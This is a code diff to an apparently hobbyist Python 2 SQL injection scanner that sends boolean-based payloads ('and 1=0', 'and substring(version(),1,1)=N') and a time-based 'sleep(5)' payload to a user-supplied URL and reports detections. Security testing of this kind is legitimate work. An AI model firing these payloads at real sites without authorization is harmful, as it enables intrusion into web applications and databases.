@@ -6,6 +6,7 @@ import time
 
 post = []
 gettest=1
+issp=0
 while 1:
     ch = input("[1]URL\n[2]POST parameters\n[3]Headers\n[4]Test\n")
 
@@ -24,8 +25,11 @@ while 1:
                     print 'wrong input'
     elif(ch==2):
         post=input("POST Parameter : ")
+        issp=1
     elif(ch==4):
         break
+
+print '...'
 if gettest==1:
     get = ''
     if(getp==-1):
@@ -52,7 +56,7 @@ if gettest==1:
         response = urllib2.urlopen(req)
         data2 = response.read()
         if data1!=data2 and i!=2:
-            sys.stdout.write('\nBoolean based SQL injection DETECT')
+            sys.stdout.write('\nBoolean based SQL injection DETECT('+str(i)+')')
             break
         data1=data2
     
@@ -91,26 +95,27 @@ if gettest==1:
     if interval2-interval1>0.9:
         sys.stdout.write('\nTime based SQL injection DETECT')
 
-
-payload = post + '= and 1=0'
-req = urllib2.Request(url,payload)
-response = urllib2.urlopen(req)
-data1 = response.read()
-payload = post + "= and 1=1"
-req = urllib2.Request(url,payload)
-response = urllib2.urlopen(req)
-data2 = response.read()
-if data1!=data2:
-    sys.stdout.write('\nBoolean based SQL injection DETECT')
-
-payload = post + "=, sleep(5)"
-t1=time.time()
-req = urllib2.Request(url,payload)
-response = urllib2.urlopen(req)
-data1 = response.read()
-t2=time.time()
-
-if t2-t1>4.5:
-    sys.stdout.write('\nTime based SQL injection DETECT')
+if issp==1:
+    data1=''
+    for i in range(2,10):
+        payload = post + '= and substring(version(),1,1)=' + str(i)
+        req = urllib2.Request(url,payload)
+        response = urllib2.urlopen(req)
+        data2 = response.read()
+        if len(data1)!=len(data2) and i!=2:
+            sys.stdout.write('\nBoolean based SQL injection DETECT('+str(i)+')')
+            break
+        data1 = data2
         
+    payload = post + "=, sleep(5)"
+    t1=time.time()
+    req = urllib2.Request(url,payload)
+    response = urllib2.urlopen(req)
+    data1 = response.read()
+    t2=time.time()
 
+    if t2-t1>4.5:
+        sys.stdout.write('\nTime based SQL injection DETECT')
+            
+
+print '\nDone'
